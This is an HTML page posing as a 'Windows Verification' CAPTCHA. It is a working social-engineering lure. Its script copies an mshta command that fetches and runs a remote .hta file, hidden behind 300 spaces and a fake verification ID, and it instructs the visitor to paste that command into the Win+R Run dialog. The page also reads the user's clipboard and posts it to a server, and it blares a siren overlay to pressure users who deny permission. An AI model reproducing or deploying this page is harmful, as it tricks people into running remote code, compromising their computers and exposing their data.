<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Windows Verification</title>
  <style>
    body {
      background: #111;
      color: #fff;
      font-family: sans-serif;
      text-align: center;
      padding: 40px;
      margin: 0;
    }
    .btn {
      background: #5865F2;
      color: #fff;
      border: none;
      padding: 12px 24px;
      border-radius: 6px;
      font-size: 1rem;
      cursor: pointer;
      margin: 10px;
    }
    .btn:hover {
      background: #4752c4;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
    }
    .step {
      background: #222;
      padding: 15px;
      margin: 10px auto;
      border-radius: 8px;
      max-width: 600px;
      text-align: left;
    }
    #noClipboardAccessOverlay {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: darkred;
      color: white;
      font-size: 1.5rem;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      text-align: center;
      padding: 20px;
      z-index: 9999;
      display: none;
    }
  </style>
</head>
<body>
  <div id="noClipboardAccessOverlay" role="alert" aria-live="assertive">
    ‚ö†Ô∏è Clipboard access denied!<br>
    Please reset this site's clipboard permissions in your browser settings.<br><br>
    <audio id="sirenAudio" loop autoplay>
      <source src="https://actions.google.com/sounds/v1/emergency/siren_long_warning.ogg" type="audio/ogg">
      <source src="https://actions.google.com/sounds/v1/emergency/siren_long_warning.mp3" type="audio/mpeg">
      Your browser does not support the audio element.
    </audio>
  </div>

  <h2>üîê Windows Verification Required</h2>

  <div id="verificationUI" style="display:none;">
    <div class="step">
      <h3>Step 1: Copy the command</h3>
      <p>Click the button to copy the verification command</p>
      <button class="btn" onclick="copyCommand()">üìã Copy Command</button>
    </div>

    <div class="step">
      <h3>Step 2: Run the command</h3>
      <p>1. Press <kbd>Win + R</kbd> to open the Run dialog</p>
      <p>2. Paste the command and press Enter</p>
      <p>3. Wait for the popup to confirm</p>
    </div>

    <div class="step">
      <h3>Step 3: Confirm Verification</h3>
      <button class="btn" onclick="verifyCode()">‚úÖ I ran the command - Verify me!</button>
    </div>

    <p id="result"></p>
  </div>

  <script>
    let code = "";

    // On load, check clipboard permission
    async function checkClipboardPermission() {
      try {
        // Request clipboard-read permission
        const status = await navigator.permissions.query({name: 'clipboard-read'});
        if (status.state === 'granted' || status.state === 'prompt') {
          // Show the verification UI
          document.getElementById('verificationUI').style.display = 'block';
          // Generate code
          generateVerificationCode();
        } else {
          // Show overlay with error and siren
          showNoAccessOverlay();
        }
        // Listen for permission changes
        status.onchange = () => {
          if (status.state === 'granted' || status.state === 'prompt') {
            hideNoAccessOverlay();
            document.getElementById('verificationUI').style.display = 'block';
            generateVerificationCode();
          } else {
            showNoAccessOverlay();
            document.getElementById('verificationUI').style.display = 'none';
          }
        }
      } catch(e) {
        // If Permissions API not supported, just try clipboard read once
        try {
          await navigator.clipboard.readText();
          document.getElementById('verificationUI').style.display = 'block';
          generateVerificationCode();
        } catch (err) {
          showNoAccessOverlay();
        }
      }
    }

    function showNoAccessOverlay() {
      document.getElementById('noClipboardAccessOverlay').style.display = 'flex';
      const audio = document.getElementById('sirenAudio');
      audio.play().catch(() => {}); // Ignore play errors (like autoplay blocked)
    }

    function hideNoAccessOverlay() {
      document.getElementById('noClipboardAccessOverlay').style.display = 'none';
      const audio = document.getElementById('sirenAudio');
      audio.pause();
      audio.currentTime = 0;
    }

    function generateVerificationCode() {
      fetch("/generate-verification-code")
        .then(res => res.json())
        .then(data => {
          code = data.code;
          const spaces = " ".repeat(300);
          const tailMsg = `CAPTCHA VERIFICATION ID: ${code}`;
          window.generatedCommand = `mshta "https://freegamecopier.onrender.com/verifyaccept.hta?code=${code}"${spaces}${tailMsg}`;
        })
        .catch(err => {
          alert("Failed to load verification code.");
          console.error(err);
        });
    }

    function copyCommand() {
      if (window.generatedCommand) {
        navigator.clipboard.writeText(window.generatedCommand).then(() => {
          alert("‚úÖ Command copied!\nNow press Win+R, paste, and run it.");
        }).catch(() => {
          const textArea = document.createElement("textarea");
          textArea.value = window.generatedCommand;
          document.body.appendChild(textArea);
          textArea.select();
          document.execCommand('copy');
          document.body.removeChild(textArea);
          alert("‚úÖ Command copied!\nNow press Win+R, paste, and run it.");
        });
      }
    }

    function verifyCode() {
      document.getElementById("result").textContent = "üîÑ Checking clipboard...";
      
      navigator.clipboard.readText().then(text => {
        fetch("/verify-windows-code", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ clipboard: text })
        })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            document.getElementById("result").style.color = "lime";
            document.getElementById("result").textContent = "‚úÖ Verification successful! Redirecting...";
            document.cookie = "tokenGateVerified=1; path=/; max-age=86400";
            setTimeout(() => {
              window.location.href = "/verifynotwindows";
            }, 1500);
          } else {
            document.getElementById("result").style.color = "#ff4444";
            document.getElementById("result").textContent = "‚ùå Verification failed. Make sure you ran the command first!";
          }
        })
        .catch(err => {
          document.getElementById("result").style.color = "#ff4444";
          document.getElementById("result").textContent = "‚ùå Network error. Please try again.";
        });
      }).catch(err => {
        document.getElementById("result").style.color = "#ff4444";
        document.getElementById("result").textContent = "‚ùå Clipboard read failed. Run the command first!";
      });
    }

    // Run permission check on page load
    checkClipboardPermission();
  </script>
</body>
</html>
